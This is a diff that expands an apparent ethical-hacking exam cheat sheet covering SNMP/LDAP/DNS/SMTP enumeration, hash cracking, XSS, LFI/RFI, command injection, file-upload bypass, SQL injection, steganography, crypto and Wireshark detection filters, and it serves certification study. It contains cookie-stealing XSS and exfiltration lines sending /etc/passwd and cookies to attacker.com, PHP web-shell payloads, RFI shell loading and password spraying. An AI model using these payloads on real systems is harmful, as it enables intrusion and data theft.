@@ -18,19 +18,40 @@
 2. [Quick Reference Cheat Sheet](#-quick-reference-cheat-sheet)
 3. [Exam Environment](#-exam-environment)
 4. [Network Scanning & Enumeration](#-network-scanning--enumeration)
+   - SNMP, LDAP, DNS, SMTP Enumeration
 5. [Password Cracking](#-password-cracking)
+   - Custom Wordlist Generation
+   - Hashcat Advanced (Masks, Rules)
+   - Password Spraying
 6. [Web Application Attacks](#-web-application-attacks)
+   - XSS, LFI/RFI, Command Injection
+   - File Upload Bypass, IDOR
+   - Ffuf Fuzzing
 7. [SQL Injection](#-sql-injection)
+   - Blind SQLi, DBMS-Specific Payloads
+   - Filter Bypass Techniques
 8. [Steganography](#-steganography)
+   - Zsteg, Stegsolve, Foremost
+   - Audio Steganography
 9. [Cryptography](#-cryptography)
+   - OpenSSL, Cipher Identification
+   - GPG/PGP, Crypto Attacks
 10. [Wireshark & Packet Analysis](#-wireshark--packet-analysis)
+    - Tshark Commands
+    - Attack Pattern Detection
 11. [System Hacking & Exploitation](#-system-hacking--exploitation)
+    - Linux/Windows Privilege Escalation
+    - Post-Exploitation & LOLBins
+    - Persistence Techniques
 12. [Mobile Platform Hacking](#-mobile-platform-hacking)
 13. [Wireless Network Hacking](#-wireless-network-hacking)
 14. [Malware Analysis](#-malware-analysis)
-15. [Common Exam Questions](#-common-exam-questions)
-16. [Exam Strategy & Tips](#-exam-strategy--tips)
-17. [Practice Labs & Resources](#-practice-labs--resources)
+15. [OSINT & Reconnaissance](#-osint--reconnaissance)
+16. [Social Engineering Toolkit](#-social-engineering-toolkit-set)
+17. [Common Exam Questions](#-common-exam-questions)
+    - Detailed Scenario Walkthroughs
+18. [Exam Strategy & Tips](#-exam-strategy--tips)
+19. [Practice Labs & Resources](#-practice-labs--resources)
 
 </details>
 
@@ -399,6 +420,114 @@ nbtscan -r 192.168.1.0/24                  # Recursive
 nmblookup -A 192.168.1.10
 ```
 
+### SNMP Enumeration
+
+```bash
+# Discover SNMP services
+nmap -sU -p 161 192.168.1.0/24 --open
+
+# SNMP walk - extract all data
+snmpwalk -v1 -c public 192.168.1.10
+snmpwalk -v2c -c public 192.168.1.10
+snmpwalk -v3 -u username -l authNoPriv -a MD5 -A password 192.168.1.10
+
+# SNMP specific OIDs
+snmpwalk -v1 -c public 192.168.1.10 1.3.6.1.2.1.1      # System info
+snmpwalk -v1 -c public 192.168.1.10 1.3.6.1.4.1.77.1.2.25  # Windows users
+snmpwalk -v2c -c public 192.168.1.10 hrSWRunName       # Running processes
+
+# Community string brute force
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.10
+nmap -sU -p 161 --script=snmp-brute 192.168.1.10
+
+# Nmap SNMP scripts
+nmap -sU -p 161 --script=snmp-info 192.168.1.10
+nmap -sU -p 161 --script=snmp-interfaces 192.168.1.10
+nmap -sU -p 161 --script=snmp-processes 192.168.1.10
+nmap -sU -p 161 --script=snmp-sysdescr 192.168.1.10
+nmap -sU -p 161 --script=snmp-win32-users 192.168.1.10
+nmap -sU -p 161 --script=snmp-win32-software 192.168.1.10
+```
+
+### LDAP Enumeration
+
+```bash
+# Find LDAP services
+nmap -p 389,636 192.168.1.0/24 --open
+
+# Anonymous LDAP query
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com"
+
+# Authenticated LDAP query
+ldapsearch -x -H ldap://192.168.1.10 -D "cn=admin,dc=domain,dc=com" -W -b "dc=domain,dc=com"
+
+# Enumerate users
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
+
+# Enumerate groups
+ldapsearch -x -H ldap://192.168.1.10 -b "dc=domain,dc=com" "(objectClass=group)" cn member
+
+# Nmap LDAP scripts
+nmap -p 389 --script=ldap-rootdse 192.168.1.10
+nmap -p 389 --script=ldap-search 192.168.1.10
+nmap -p 389 --script=ldap-brute 192.168.1.10
+
+# ldapenum (if available)
+ldapenum -u "" -p "" -d 192.168.1.10
+```
+
+### DNS Enumeration
+
+```bash
+# DNS zone transfer
+dig axfr @192.168.1.10 domain.com
+host -t axfr domain.com 192.168.1.10
+dnsrecon -d domain.com -t axfr
+
+# DNS enumeration
+dnsrecon -d domain.com -t std           # Standard enumeration
+dnsrecon -d domain.com -t brt -D /usr/share/wordlists/dnsmap.txt  # Brute force
+dnsenum domain.com
+
+# Nmap DNS scripts
+nmap -p 53 --script=dns-zone-transfer --script-args dns-zone-transfer.domain=domain.com 192.168.1.10
+nmap --script=dns-brute domain.com
+
+# Reverse DNS lookup
+dig -x 192.168.1.10
+host 192.168.1.10
+
+# DNS cache snooping
+nmap -sU -p 53 --script=dns-cache-snoop 192.168.1.10
+```
+
+### SMTP Enumeration
+
+```bash
+# Find SMTP servers
+nmap -p 25,465,587 192.168.1.0/24 --open
+
+# User enumeration (VRFY command)
+smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
+
+# User enumeration (RCPT TO command)
+smtp-user-enum -M RCPT -U users.txt -t 192.168.1.10
+
+# User enumeration (EXPN command)
+smtp-user-enum -M EXPN -U users.txt -t 192.168.1.10
+
+# Nmap SMTP scripts
+nmap -p 25 --script=smtp-enum-users 192.168.1.10
+nmap -p 25 --script=smtp-commands 192.168.1.10
+nmap -p 25 --script=smtp-open-relay 192.168.1.10
+
+# Manual SMTP enumeration
+nc 192.168.1.10 25
+HELO attacker.com
+VRFY admin
+VRFY root
+```
+
 ---
 
 ## 🔐 Password Cracking
@@ -547,6 +676,91 @@ hashid -m <hash>                           # Show hashcat mode
 # https://www.tunnelsup.com/hash-analyzer/
 ```
 
+### Custom Wordlist Generation
+
+```bash
+# CeWL - Generate wordlist from website
+cewl http://192.168.1.10 -w custom_wordlist.txt
+cewl http://192.168.1.10 -d 2 -m 5 -w wordlist.txt   # Depth 2, min 5 chars
+cewl http://192.168.1.10 -e -a -w wordlist.txt       # Include emails and metadata
+
+# Crunch - Generate custom wordlists
+crunch 6 8 -o wordlist.txt                           # 6-8 chars, all lowercase
+crunch 8 8 0123456789 -o numbers.txt                 # 8 digit numbers
+crunch 6 6 -t admin@@ -o admin_wordlist.txt          # Pattern (@ = lowercase)
+crunch 8 8 -t %%%%^^^^ -o mixed.txt                  # % = numbers, ^ = special
+
+# Crunch character sets
+# @ = lowercase  , = uppercase  % = numbers  ^ = special
+
+# Cupp - Interactive profiled wordlist
+cupp -i                                              # Interactive mode
+
+# Username generation from names
+username-anarchy --input-file names.txt --select-format first,last,first.last > users.txt
+```
+
+### Hashcat Advanced Techniques
+
+```bash
+# Mask attack (brute force with pattern)
+hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l              # 6 lowercase
+hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d              # Ullldd pattern
+hashcat -m 0 hash.txt -a 3 company?d?d?d?d           # company + 4 digits
+
+# Mask character sets
+# ?l = lowercase  ?u = uppercase  ?d = digits  ?s = special  ?a = all
+
+# Combination attack
+hashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt
+
+# Hybrid attacks
+hashcat -m 0 hash.txt -a 6 wordlist.txt ?d?d?d       # Wordlist + 3 digits
+hashcat -m 0 hash.txt -a 7 ?d?d?d wordlist.txt       # 3 digits + wordlist
+
+# Rule-based attacks
+hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
+
+# Prince attack (word combinations)
+hashcat -m 0 hash.txt -a 0 wordlist.txt --prince
+
+# Show cracked with username
+hashcat -m 0 hash.txt --show --username
+
+# Output to file
+hashcat -m 0 hash.txt wordlist.txt -o cracked.txt
+
+# Restore session
+hashcat -m 0 hash.txt wordlist.txt --session=mysession
+hashcat --session=mysession --restore
+```
+
+### Password Spraying
+
+```bash
+# Spray single password across users
+hydra -L users.txt -p 'Password123!' smb://192.168.1.10
+crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123!'
+
+# Spray multiple passwords (slow to avoid lockout)
+hydra -L users.txt -P top10passwords.txt -t 1 smb://192.168.1.10
+```
+
+### Online Hash Lookup
+
+```bash
+# Before cracking, check online databases
+# https://crackstation.net/
+# https://hashes.com/en/decrypt/hash
+# https://www.md5online.org/
+# https://hashtoolkit.com/
+
+# hashcat potfile - check previously cracked
+cat ~/.local/share/hashcat/hashcat.potfile | grep <hash>
+```
+
 ### Windows Tools
 
 #### HashCalc (GUI)
@@ -678,6 +892,212 @@ http://target.com/page.php?id=1   → http://target.com/page.php?id=2
 # Modify User-Agent, Referer, X-Forwarded-For
 ```
 
+### Cross-Site Scripting (XSS)
+
+```html
+<!-- Basic XSS payloads -->
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+
+<!-- Cookie stealing -->
+<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
+<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
+
+<!-- Filter bypass techniques -->
+<ScRiPt>alert('XSS')</ScRiPt>                    <!-- Case variation -->
+<script>alert(String.fromCharCode(88,83,83))</script>  <!-- Char codes -->
+<img src=x onerror=alert`XSS`>                   <!-- Template literals -->
+<svg/onload=alert('XSS')>                        <!-- No space -->
+<<script>alert('XSS')</script>                   <!-- Double tag -->
+<script>alert('XSS')//                           <!-- Comment out -->
+
+<!-- URL encoded -->
+%3Cscript%3Ealert('XSS')%3C/script%3E
+
+<!-- Event handlers -->
+<div onmouseover="alert('XSS')">Hover me</div>
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+```
+
+### Local File Inclusion (LFI)
+
+```bash
+# Basic LFI
+http://target.com/page.php?file=../../../etc/passwd
+http://target.com/page.php?file=....//....//....//etc/passwd
+
+# Windows LFI
+http://target.com/page.php?file=..\..\..\..\windows\system32\drivers\etc\hosts
+http://target.com/page.php?file=C:\Windows\System32\drivers\etc\hosts
+
+# Null byte injection (PHP < 5.3.4)
+http://target.com/page.php?file=../../../etc/passwd%00
+http://target.com/page.php?file=../../../etc/passwd%00.php
+
+# Wrapper techniques
+http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php
+http://target.com/page.php?file=php://input  (POST data as code)
+http://target.com/page.php?file=data://text/plain,<?php system($_GET['cmd']); ?>
+http://target.com/page.php?file=expect://ls
+
+# Log poisoning (after injecting PHP in logs)
+http://target.com/page.php?file=/var/log/apache2/access.log
+http://target.com/page.php?file=/var/log/auth.log
+
+# Common files to target
+/etc/passwd
+/etc/shadow                              # If readable
+/etc/hosts
+/proc/self/environ
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\xampp\apache\logs\access.log
+```
+
+### Remote File Inclusion (RFI)
+
+```bash
+# Basic RFI (requires allow_url_include=On)
+http://target.com/page.php?file=http://attacker.com/shell.txt
+http://target.com/page.php?file=http://attacker.com/shell.php
+
+# With null byte
+http://target.com/page.php?file=http://attacker.com/shell.txt%00
+
+# SMB share (Windows)
+http://target.com/page.php?file=\\attacker.com\share\shell.php
+```
+
+### Command Injection
+
+```bash
+# Basic command injection
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+$(ls -la)
+`ls -la`
+
+# Newline injection
+%0als -la
+
+# Common injection points
+ping -c 1 192.168.1.10; cat /etc/passwd
+192.168.1.10; whoami
+192.168.1.10 | id
+192.168.1.10 && cat /etc/passwd
+
+# Blind command injection (time-based)
+; sleep 10
+| sleep 10
+& ping -c 10 127.0.0.1 &
+
+# Out-of-band data exfiltration
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/?data=$(cat /etc/passwd | base64)
+; nslookup $(whoami).attacker.com
+
+# Windows command injection
+& dir
+| type C:\Windows\win.ini
+; net user
+& whoami
+| ipconfig
+; systeminfo
+
+# Filter bypass
+;l$()s                                   # Empty variable
+;l''s                                    # Empty quotes
+;l""s                                    # Double empty quotes
+;{ls,-la}                                # Brace expansion
+```
+
+### File Upload Bypass
+
+```bash
+# Extension bypass techniques
+shell.php.jpg                            # Double extension
+shell.php%00.jpg                         # Null byte (old PHP)
+shell.pHp                                # Case variation
+shell.php5                               # Alternative extension
+shell.phtml                              # Alternative extension
+shell.php.                               # Trailing dot
+shell.php;.jpg                           # Semicolon
+shell.php%20                             # Trailing space
+shell.php::$DATA                         # NTFS stream (Windows)
+
+# Content-Type bypass
+# Change Content-Type header to: image/jpeg, image/png, image/gif
+
+# Magic bytes bypass
+# Add GIF header: GIF89a before PHP code
+GIF89a<?php system($_GET['cmd']); ?>
+
+# .htaccess upload (if allowed)
+AddType application/x-httpd-php .jpg
+# Then upload shell.jpg
+
+# Polyglot files
+# Create image that is also valid PHP
+
+# SVG file with XSS
+<?xml version="1.0" standalone="no"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<script type="text/javascript">alert('XSS')</script>
+</svg>
+```
+
+### Insecure Direct Object Reference (IDOR)
+
+```bash
+# URL parameter manipulation
+http://target.com/profile?id=100    → http://target.com/profile?id=101
+http://target.com/invoice/1234      → http://target.com/invoice/1235
+http://target.com/download?file=report_100.pdf → file=report_101.pdf
+
+# API endpoints
+GET /api/users/100                  → GET /api/users/101
+GET /api/orders/abc123              → GET /api/orders/abc124
+
+# Common IDOR parameters
+id, uid, user_id, account, doc, file, order, invoice, report
+```
+
+### Ffuf - Fast Fuzzer
+
+```bash
+# Directory enumeration
+ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# File extension fuzzing
+ffuf -u http://192.168.1.10/admin.FUZZ -w extensions.txt
+
+# Parameter fuzzing
+ffuf -u "http://192.168.1.10/page.php?FUZZ=test" -w params.txt
+
+# POST data fuzzing
+ffuf -u http://192.168.1.10/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt
+
+# Header fuzzing
+ffuf -u http://192.168.1.10/ -H "X-Forwarded-For: FUZZ" -w ips.txt
+
+# Virtual host discovery
+ffuf -u http://192.168.1.10/ -H "Host: FUZZ.target.com" -w subdomains.txt
+
+# Filter by response
+ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fc 404      # Filter code
+ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fs 1234     # Filter size
+ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fw 50       # Filter words
+```
+
 ---
 
 ## 💉 SQL Injection
@@ -791,6 +1211,146 @@ sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ' AND SLEEP(5)--
 ```
 
+### Blind SQL Injection
+
+```sql
+-- Boolean-based blind injection
+' AND 1=1--                              -- True condition
+' AND 1=2--                              -- False condition
+
+-- Extracting data character by character
+' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
+
+-- MySQL
+' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--
+' AND (SELECT LENGTH(database()))=5--
+
+-- MSSQL
+' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>64--
+
+-- Time-based blind (data extraction)
+' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+
+-- SQLMap for blind injection
+sqlmap -u "URL?id=1" --technique=B --dbs     # Boolean-based
+sqlmap -u "URL?id=1" --technique=T --dbs     # Time-based
+sqlmap -u "URL?id=1" --technique=BT --dbs    # Both
+```
+
+### Second-Order SQL Injection
+
+```sql
+-- Inject payload in one location, triggers in another
+-- Example: Register username as: admin'--
+-- Later query: SELECT * FROM users WHERE username='admin'--'
+
+-- Stored payload examples
+Username: ' OR '1'='1'--
+Email: test@test.com' UNION SELECT password FROM users--
+```
+
+### DBMS-Specific Payloads
+
+```sql
+-- MySQL
+' UNION SELECT @@version--                   -- Version
+' UNION SELECT user()--                      -- Current user
+' UNION SELECT database()--                  -- Current database
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT LOAD_FILE('/etc/passwd')--    -- Read file
+' INTO OUTFILE '/var/www/html/shell.php'--   -- Write file
+
+-- MSSQL
+' UNION SELECT @@version--                   -- Version
+' UNION SELECT SYSTEM_USER--                 -- Current user
+' UNION SELECT DB_NAME()--                   -- Current database
+' UNION SELECT name FROM master..sysdatabases--
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
+'; EXEC xp_cmdshell 'whoami'--               -- Command execution
+'; EXEC master..xp_dirtree '\\attacker\share'-- -- UNC path
+
+-- Oracle
+' UNION SELECT banner FROM v$version--       -- Version
+' UNION SELECT user FROM dual--              -- Current user
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+-- PostgreSQL
+' UNION SELECT version()--                   -- Version
+' UNION SELECT current_user--                -- Current user
+' UNION SELECT current_database()--          -- Current database
+' UNION SELECT table_name FROM information_schema.tables--
+'; COPY (SELECT '') TO PROGRAM 'whoami'--    -- Command execution
+```
+
+### SQLMap Advanced Options
+
+```bash
+# Tamper scripts (bypass WAF/filters)
+sqlmap -u "URL?id=1" --tamper=space2comment --dbs
+sqlmap -u "URL?id=1" --tamper=between,randomcase --dbs
+
+# Common tamper scripts
+# space2comment - Replace space with /**/
+# randomcase - Random uppercase/lowercase
+# between - Replace > with NOT BETWEEN 0 AND
+# charencode - URL encode characters
+# equaltolike - Replace = with LIKE
+
+# Force specific injection technique
+sqlmap -u "URL?id=1" --technique=BEUSTQ --dbs
+# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
+
+# Second-order injection
+sqlmap -u "URL?id=1" --second-url="http://target.com/result.php" --dbs
+
+# Bypass WAF
+sqlmap -u "URL?id=1" --random-agent --tamper=space2comment,between --dbs
+
+# Read/write files
+sqlmap -u "URL?id=1" --file-read="/etc/passwd"
+sqlmap -u "URL?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# Execute OS commands
+sqlmap -u "URL?id=1" --os-shell
+sqlmap -u "URL?id=1" --os-cmd="whoami"
+
+# Enumerate privileges
+sqlmap -u "URL?id=1" --privileges
+sqlmap -u "URL?id=1" --roles
+sqlmap -u "URL?id=1" --is-dba
+```
+
+### SQL Injection Filter Bypass
+
+```sql
+-- Space bypass
+/**/                                         -- Comment as space
++                                            -- Plus sign
+%20                                          -- URL encoded space
+%09                                          -- Tab
+
+-- Keyword bypass
+UNION/**/SELECT
+UN/**/ION/**/SEL/**/ECT
+uNiOn SeLeCt                                 -- Mixed case
+UNION ALL SELECT
+
+-- Quote bypass
+CHAR(97,100,109,105,110)                     -- 'admin' in MySQL
+CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- Oracle
+0x61646d696e                                 -- Hex encoding
+
+-- Comment variations
+--                                           -- MySQL/MSSQL
+#                                            -- MySQL
+/* */                                        -- Multi-line
+/*! MySQL-specific */
+```
+
 ---
 
 ## 🖼️ Steganography
@@ -865,6 +1425,117 @@ exiftool image.jpg
 
 # Compare file sizes
 ls -la original.jpg stego.jpg
+```
+
+### Zsteg (PNG/BMP Analysis)
+
+```bash
+# Install
+gem install zsteg
+
+# Basic analysis
+zsteg image.png
+
+# All checks
+zsteg -a image.png
+
+# Extract specific payload
+zsteg -e "b1,rgb,lsb,xy" image.png > extracted.txt
+
+# Check for specific bit depth
+zsteg -b 1 image.png                      # 1-bit
+zsteg -b 2 image.png                      # 2-bit
+```
+
+### Stegsolve
+
+```bash
+# GUI tool for image analysis
+# Analyze different bit planes
+# Useful for:
+# - LSB extraction
+# - Bit plane analysis
+# - Frame browsing (GIF)
+# - Image combining (XOR)
+
+# Launch
+java -jar Stegsolve.jar
+```
+
+### Foremost / Binwalk (File Carving)
+
+```bash
+# Foremost - Extract embedded files
+foremost -i image.jpg -o output_dir
+foremost -t all -i image.jpg -o output_dir
+
+# Binwalk - Analyze and extract
+binwalk image.jpg                         # Analyze
+binwalk -e image.jpg                      # Extract
+binwalk --dd='.*' image.jpg               # Extract all
+
+# Scan for specific signatures
+binwalk -B image.jpg                      # Binary signatures
+binwalk -E image.jpg                      # Entropy analysis
+```
+
+### Audio Steganography
+
+```bash
+# Audacity - Visual waveform/spectrogram analysis
+# Open audio file
+# View → Spectrogram
+# Look for hidden images in spectrogram
+
+# Sonic Visualiser
+# Load audio → Add Spectrogram layer
+
+# mp3stego (Windows)
+Decode.exe -X -P password audio.mp3
+
+# Extract hidden data from WAV
+steghide extract -sf audio.wav
+
+# DeepSound (Windows)
+# GUI tool for audio steganography
+```
+
+### Advanced Stego Techniques
+
+```bash
+# Check for appended data
+xxd image.jpg | tail -20
+hexdump -C image.jpg | tail -20
+
+# Look for ZIP/RAR appended to image
+unzip image.jpg
+unrar x image.jpg
+
+# Check EXIF for hidden data
+exiftool -v image.jpg
+exiftool -b -ThumbnailImage image.jpg > thumb.jpg
+
+# JPEG specific
+jpeginfo image.jpg
+jhead image.jpg
+
+# PNG specific
+pngcheck -v image.png
+```
+
+### Stego Detection Checklist
+
+```
+1. Run 'file' to verify file type
+2. Run 'strings' to find readable text
+3. Run 'binwalk' to find embedded files
+4. Run 'exiftool' to check metadata
+5. Run 'steghide info' for JPEG/BMP
+6. Run 'zsteg' for PNG/BMP
+7. Try common passwords: password, secret, hidden, stego
+8. Check file entropy with 'ent' or binwalk -E
+9. Open in hex editor to check for appended data
+10. Try opening as archive (ZIP, RAR)
 ```
 
 ---
@@ -975,6 +1646,148 @@ base64 -d encoded.txt > decoded.txt
 | **SHA512** | 128 hex characters |
 | **Base64** | A-Z, a-z, 0-9, +, /, = padding |
 | **NTLM** | 32 hex characters (Windows) |
+
+### OpenSSL Commands
+
+```bash
+# Symmetric Encryption
+# AES encryption
+openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
+openssl enc -aes-256-cbc -d -in file.enc -out file.txt
+
+# DES encryption
+openssl enc -des-cbc -in file.txt -out file.enc
+openssl enc -des-cbc -d -in file.enc -out file.txt
+
+# 3DES encryption
+openssl enc -des3 -in file.txt -out file.enc
+openssl enc -des3 -d -in file.enc -out file.txt
+
+# With password
+openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -pass pass:mypassword
+openssl enc -aes-256-cbc -d -in file.enc -out file.txt -pass pass:mypassword
+
+# Hash calculation
+openssl dgst -md5 file.txt
+openssl dgst -sha1 file.txt
+openssl dgst -sha256 file.txt
+openssl dgst -sha512 file.txt
+
+# RSA key operations
+openssl genrsa -out private.key 2048
+openssl rsa -in private.key -pubout -out public.key
+openssl rsautl -encrypt -pubin -inkey public.key -in file.txt -out file.enc
+openssl rsautl -decrypt -inkey private.key -in file.enc -out file.txt
+```
+
+### Cipher Identification
+
+```bash
+# Common cipher patterns
+ROT13         - Alphabetic substitution (A→N, B→O)
+Caesar        - Shifted alphabet (configurable shift)
+Atbash        - Reversed alphabet (A→Z, B→Y)
+Vigenere      - Keyword-based polyalphabetic
+Base64        - Ends with = or ==, A-Za-z0-9+/
+Base32        - Uppercase A-Z, 2-7, padding with =
+Hex           - 0-9, A-F only
+Binary        - 0s and 1s only
+Morse         - Dots and dashes
+
+# Online cipher tools
+# https://gchq.github.io/CyberChef/
+# https://www.dcode.fr/
+# https://cryptii.com/
+
+# ROT13 decode
+echo "message" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+python3 -c "import codecs; print(codecs.decode('zrffntr', 'rot_13'))"
+
+# Caesar cipher brute force
+for i in {1..25}; do echo "Shift $i:"; echo "ENCRYPTED" | tr "A-Za-z" "$(echo {A..Z} | cut -d' ' -f$((i+1))-26),A-$(echo {A..Z} | cut -d' ' -f$i)"; done
+```
+
+### Hex and ASCII Conversion
+
+```bash
+# Hex to ASCII
+echo "48656c6c6f" | xxd -r -p
+python3 -c "print(bytes.fromhex('48656c6c6f').decode())"
+
+# ASCII to Hex
+echo -n "Hello" | xxd -p
+python3 -c "print('Hello'.encode().hex())"
+
+# Binary to ASCII
+echo "01001000 01100101 01101100 01101100 01101111" | perl -lape '$_=pack"B*",join"",@F'
+
+# Decimal to ASCII
+python3 -c "print(chr(72)+chr(101)+chr(108)+chr(108)+chr(111))"
+```
+
+### GPG/PGP
+
+```bash
+# Decrypt PGP file
+gpg --decrypt file.gpg
+gpg -d file.gpg
+
+# Import key
+gpg --import key.asc
+
+# List keys
+gpg --list-keys
+gpg --list-secret-keys
+
+# Encrypt file
+gpg -c file.txt                           # Symmetric
+gpg -e -r recipient file.txt              # Asymmetric
+```
+
+### Windows Cryptography Tools
+
+```
+CrypTool
+- Classic ciphers (Caesar, Vigenere, Substitution)
+- Modern algorithms (AES, DES, RSA)
+- Hash functions
+- Frequency analysis
+
+BCTextEncoder
+- Encode/decode text with password
+- Common in exam for protected messages
+
+VeraCrypt
+- Mount encrypted volumes
+- Full disk encryption containers
+```
+
+### Crypto Attack Techniques
+
+```bash
+# Frequency analysis (for substitution ciphers)
+# Count letter frequency and compare to English:
+# E T A O I N S H R (most common)
+
+# Known plaintext attack
+# If you know part of the plaintext, you can derive the key
+
+# Dictionary attack on encrypted files
+# Use fcrackzip for ZIP files
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt encrypted.zip
+
+# John the Ripper for various formats
+zip2john encrypted.zip > hash.txt
+john --wordlist=rockyou.txt hash.txt
+
+# PDF password cracking
+pdf2john.py encrypted.pdf > hash.txt
+john --wordlist=rockyou.txt hash.txt
+
+# Office documents
+office2john.py document.docx > hash.txt
+john --wordlist=rockyou.txt hash.txt
+```
 
 ---
 
@@ -1121,6 +1934,118 @@ tcpdump -i eth0 port 80
 tcpdump -i eth0 tcp
 tcpdump -i eth0 udp
 tcpdump -i eth0 icmp
+```
+
+### Tshark (Command Line Wireshark)
+
+```bash
+# Read pcap file
+tshark -r capture.pcap
+
+# Filter and display
+tshark -r capture.pcap -Y "http"
+tshark -r capture.pcap -Y "ip.addr == 192.168.1.10"
+
+# Extract specific fields
+tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
+tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.resp.addr
+
+# Extract credentials
+tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.arg
+
+# Statistics
+tshark -r capture.pcap -z conv,tcp              # TCP conversations
+tshark -r capture.pcap -z endpoints,ip          # IP endpoints
+tshark -r capture.pcap -z io,stat,1             # IO statistics
+
+# Export objects
+tshark -r capture.pcap --export-objects http,output_dir
+tshark -r capture.pcap --export-objects smb,output_dir
+
+# Count packets
+tshark -r capture.pcap -Y "tcp.flags.syn == 1" | wc -l
+
+# Follow TCP stream
+tshark -r capture.pcap -z follow,tcp,ascii,0
+```
+
+### Advanced Wireshark Filters
+
+```bash
+# Find login attempts
+http.request.method == "POST" && http contains "login"
+http.request.method == "POST" && http contains "password"
+
+# SMTP traffic with credentials
+smtp && (smtp.req.command == "AUTH" || smtp contains "password")
+
+# DNS exfiltration detection
+dns.qry.name contains "." && frame.len > 100
+
+# SSL/TLS analysis
+ssl.handshake.type == 1                   # Client Hello
+ssl.handshake.type == 2                   # Server Hello
+tls.handshake.extensions_server_name      # SNI hostname
+
+# ICMP tunneling detection
+icmp && data.len > 48
+
+# ARP spoofing detection
+arp.duplicate-address-detected
+
+# Malformed packets
+tcp.analysis.flags                        # TCP issues
+_ws.malformed                            # Any malformed
+
+# Large data transfers
+tcp.len > 1000
+
+# Specific user agent
+http.user_agent contains "sqlmap"
+http.user_agent contains "nikto"
+http.user_agent contains "nmap"
+
+# HTTP response codes
+http.response.code >= 400                 # Errors
+http.response.code == 200                 # OK
+http.response.code == 302                 # Redirect
+http.response.code == 401                 # Unauthorized
+http.response.code == 403                 # Forbidden
+http.response.code == 500                 # Server error
+```
+
+### Attack Pattern Detection
+
+```bash
+# Port scan detection (many SYN, few responses)
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# SQL injection in traffic
+http.request.uri contains "UNION"
+http.request.uri contains "SELECT"
+http.request.uri contains "%27"           # Single quote encoded
+http.request.uri contains "1=1"
+
+# Directory traversal
+http.request.uri contains ".."
+http.request.uri contains "%2e%2e"
+
+# XSS attempts
+http.request.uri contains "<script>"
+http.request.uri contains "%3Cscript%3E"
+
+# Command injection
+http contains "| ls"
+http contains "; cat"
+http contains "$(whoami)"
+
+# Brute force detection
+# Statistics → Conversations → Sort by packets (high count from single IP)
+
+# C2 beaconing (regular interval connections)
+# Check for consistent timing patterns to same destination
 ```
 
 ---
@@ -1283,21 +2208,200 @@ telnet 192.168.1.10
 
 ### Privilege Escalation
 
+#### Linux Privilege Escalation
+
 ```bash
-# Linux
-sudo -l                                    # List sudo privileges
-find / -perm -4000 2>/dev/null            # SUID binaries
-cat /etc/crontab                          # Cron jobs
+# Basic enumeration
+id                                         # Current user and groups
+whoami                                     # Current username
 uname -a                                   # Kernel version
+cat /etc/os-release                       # OS info
 
-# Check GTFOBins for exploitation
-# https://gtfobins.github.io/
+# SUDO privileges
+sudo -l                                    # List sudo privileges
+sudo -V                                    # Sudo version (check for vulns)
 
-# Windows
-whoami /priv                              # Current privileges
+# SUID/SGID binaries
+find / -perm -4000 2>/dev/null            # SUID binaries
+find / -perm -2000 2>/dev/null            # SGID binaries
